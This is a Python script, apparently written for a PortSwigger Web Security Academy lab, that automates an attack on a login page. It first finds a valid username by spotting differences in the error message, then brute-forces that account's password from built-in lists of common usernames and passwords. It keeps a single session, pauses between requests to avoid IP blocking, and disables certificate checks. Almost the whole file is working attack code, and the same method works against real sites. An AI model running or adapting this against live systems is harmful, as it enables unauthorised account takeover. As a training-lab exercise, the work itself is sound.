import time
import requests
import urllib3
import difflib
urllib3.disable_warnings()
URL = "https://0ac3000003ec7bbe81da5c3200d70037.web-security-academy.net/login"
TIMEOUT = (15, 30)
MAX_RETRIES = 3

usernames = [
    "carlos", "root", "admin", "test", "guest", "info", "adm", "mysql",
    "user", "administrator", "oracle", "ftp", "pi", "puppet", "ansible",
    "ec2-user", "vagrant", "azureuser", "academico", "acceso", "access",
    "accounting", "accounts", "acid", "activestat", "ad", "adam", "adkit",
    "admin", "administracion", "administrador", "administrator",
    "administrators", "admins", "ads", "adserver", "adsl", "ae", "af",
    "affiliate", "affiliates", "afiliados", "ag", "agenda", "agent", "ai",
    "aix", "ajax", "ak", "akamai", "al", "alabama", "alaska", "albuquerque",
    "alerts", "alpha", "alterwind", "am", "amarillo", "americas", "an",
    "anaheim", "analyzer", "announce", "announcements", "antivirus", "ao",
    "ap", "apache", "apollo", "app", "app01", "app1", "apple", "application",
    "applications", "apps", "appserver", "aq", "ar", "archie", "arcsight",
    "argentina", "arizona", "arkansas", "arlington", "as", "as400", "asia",
    "asterix", "at", "athena", "atlanta", "atlas", "att", "au", "auction",
    "austin", "auth", "auto", "autodiscover",
]
passwords = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring",
    "montana", "moon", "moscow",
]


incorrect_password = "incorrect_password"   
def login1(session, username, incorrect_password):
    #session形参把requests.Session()对象传入login1函数，避免在函数内部创建新的会话对象，从而保持会话状态（如cookies）在多个请求之间共享
    last_error = None

    for attempt in range(1, MAX_RETRIES + 1):
        time.sleep(0.5)
        #防止请求过于频繁，导致被目标网站封禁IP，设置每次请求间隔0.5秒
        
        try:
            start=time.time()
            
            SESSION=session.post(
                #发送正式请求
                URL,
                data={"username": username, "password": incorrect_password},
                #timeout=TIMEOUT,
                allow_redirects=False,
                verify=False  
             # 忽略SSL证书验证，避免因证书问题导致请求失败
            )
            elapsed=time.time()-start
            print(f"[+] Time taken for request: {elapsed:.2f} seconds")
            return SESSION
        
        except requests.RequestException as error:
            #requests.RequestException捕获所有请求异常，包括连接错误、超时、HTTP错误等
            last_error = error
            if attempt < MAX_RETRIES:
                print(f"[!] Request failed ({error}); retrying {attempt}/{MAX_RETRIES}...")
                time.sleep(attempt)

    raise RuntimeError(
        "The request repeatedly failed. Check the WSL proxy at 172.31.64.1:6987 "
        "and try again."
    ) from last_error
    #RuntimeError是Python的内置类，
    #from last_error表示将原始异常作为上下文附加到新的异常中，以便在调试时可以追踪到原始错误信息

def compared_line(response):
    for line in response.text.splitlines():
        if 'is-warning' in line:
            return line
    return None    
def main():
    count=1
    session = requests.Session()
    #只执行一次，创建一个会话对象，用于在多个请求之间保持某些参数（如cookies），而非独立请求
    response0=login1(session,"aaa",incorrect_password)
    #得到一个无效用户名的响应，作为基准响应
    html_text0=compared_line(response0)
    print("[*] Enumerating usernames...")

    for username in dict.fromkeys(usernames):
        response= login1(session,username,incorrect_password)
        #print("response:", response.text)  
        # diff=difflib.ndiff(response.text.splitlines(), response0.text.splitlines())
        # if any(line.startswith('+') or line.startswith('-') for line in diff):
        #     print(f"[+] Found valid username: {username}")
        # for line in diff:
        #     if line.startswith('+ ') or line.startswith('- '):
        #         print(line)    
        html_text=compared_line(response)  
        if html_text and html_text0:
            if html_text == html_text0:
                print(f"两行文本相同,第{count}次尝试")
            else:
                print("两行文本不同")
                print(f"html_text0: {repr(html_text0)}")
                print(f"html_text: {repr(html_text)}")
                print(f"[+] 找到有效用户名: {username}")
                invalid_username = username
                break    
        count+=1    

    response0=login1(session,invalid_username,incorrect_password)    
    html_text0=compared_line(response0)

    count=1
    print("[*] Enumerating passwords...")
    for password in dict.fromkeys(passwords):
        response=login1(session,invalid_username,password)
        html_text=compared_line(response)
        if html_text and html_text0:
            if html_text == html_text0:
                print(f"两行文本相同,第{count}次尝试")
                #有Invalid username or password警示时，警示相同，密码错误
        else:
            print("找到密码！")
            print(f"[+] Found valid credentials: {invalid_username}:{password}")    
            break
        count+=1    
#apache

    return 1
    
if __name__ == "__main__":
    raise SystemExit(main())
#main()函数返回退出码0表示程序成功执行，返回1表示程序执行失败。
